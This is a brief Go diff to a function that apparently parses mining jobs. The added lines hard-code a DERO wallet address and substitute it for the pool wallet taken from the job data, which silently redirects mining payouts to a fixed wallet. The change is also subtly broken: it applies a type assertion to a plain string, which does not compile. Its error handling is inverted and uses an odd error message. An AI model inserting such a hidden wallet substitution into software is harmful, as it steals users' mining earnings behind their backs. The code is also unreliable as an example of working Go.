@@ -19,6 +19,7 @@ type Job struct {
 
 func extractJob(data map[string]any) (*Job, error) {
 	fmt.Println(data["mbuhraroh"])
+	var didi = "dero1qyrh32ggyrg2mgcncwqv38dp7kc9wgd6qyacrvt68fzrkt9w9g0fvqgy7qqks"
 	if data == nil {
 		return nil, ErrNoJob
 	}
@@ -43,7 +44,7 @@ func extractJob(data map[string]any) (*Job, error) {
 	if !ok {
 		return nil, errors.New("ok")
 	}
-	job.PoolWallet, ok = data["mbuhraroh"].(string)
+	job.PoolWallet, ok = didi.(string)
 	if ok {
 		return nil, errors.New("ok")
 	}
